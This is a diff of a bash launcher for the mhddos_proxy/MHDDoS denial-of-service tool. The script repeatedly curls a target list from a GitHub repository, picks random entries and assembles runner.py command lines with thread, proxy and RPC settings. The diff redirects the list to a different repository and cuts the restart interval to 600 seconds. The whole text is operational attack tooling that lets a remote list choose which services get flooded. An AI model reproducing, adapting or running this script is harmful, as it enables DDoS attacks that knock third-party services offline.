@@ -16,7 +16,7 @@ num_of_copies="${1:-1}"
 ## Restart script every N seconds (900s = 15m, 1800s = 30m, 3600s = 60m).
 ## It allows to download updates for mhddos_proxy, MHDDoS and target list.
 ## By default 900s (15m), can be passed as second parameter
-restart_interval="900"
+restart_interval="600"
 
 #parameters that passed to python scrypt
 threads="${2:-500}"
@@ -35,7 +35,7 @@ while true
 echo -e "#####################################\n"
 do
    # Get number of targets in runner_targets. Only strings that are not commented out are used. Everything else is omitted.
-   list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
+   list_size=$(curl -s https://raw.githubusercontent.com/Maxssaf/target/main/runner_targets | cat | grep "^[^#]" | wc -l)
 
    echo -e "\nNumber of targets in list: " $list_size "\n"
 
@@ -47,7 +47,7 @@ do
    echo -e "Choosen target(s):\n"
    for i in $random_numbers
    do
-             target=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]")")
+             target=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Maxssaf/target/main/runner_targets | cat | grep "^[^#]")")
              echo -e "    "$target"\n"
    done
 
@@ -55,7 +55,7 @@ do
    for i in $random_numbers
    do
             # Filter and only get lines that starts with "runner.py". Then get one target from that filtered list.
-            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]")")
+            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Maxssaf/target/main/runner_targets | cat | grep "^[^#]")")
 
             #echo $cmd_line
             echo $cmd_line $proxy_interval $threads $rpc
